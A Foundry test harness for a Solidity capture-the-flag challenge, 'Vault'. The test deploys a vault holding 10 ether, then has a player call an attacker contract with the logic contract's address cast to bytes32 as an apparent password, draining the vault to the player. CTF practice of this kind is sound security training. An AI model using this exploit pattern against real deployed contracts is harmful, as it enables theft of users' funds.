// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/CTF/Vault.sol";
import "../../src/CTF/VaultAttacker.sol";

contract VaultExploiter is Test {
  Vault public vault;
  VaultLogic public logic;
  VaultAttacker private attacker;

  address owner = address(1);
  address player = address(2);

  function setUp() public {
    vm.deal(owner, 100 ether);

    vm.startPrank(owner);
    logic = new VaultLogic(bytes32("0x1234"));
    vault = new Vault(address(logic));
    vault.deposite{value: 10 ether}();
    vm.stopPrank();
    vm.prank(player);
    attacker = new VaultAttacker(address(vault));
  }

  function testExploit() public {
    vm.deal(player, 1 ether);
    vm.startPrank(player);

    // add your hacker code.
    attacker.getMoneyAttack{value: 1 ether}(bytes32(uint256(uint160(address(logic)))));
    console.log(address(player).balance);
    require(vault.isSolve(), "solved");
    assertEq(address(player).balance, 11 ether);
    vm.stopPrank();
  }
}
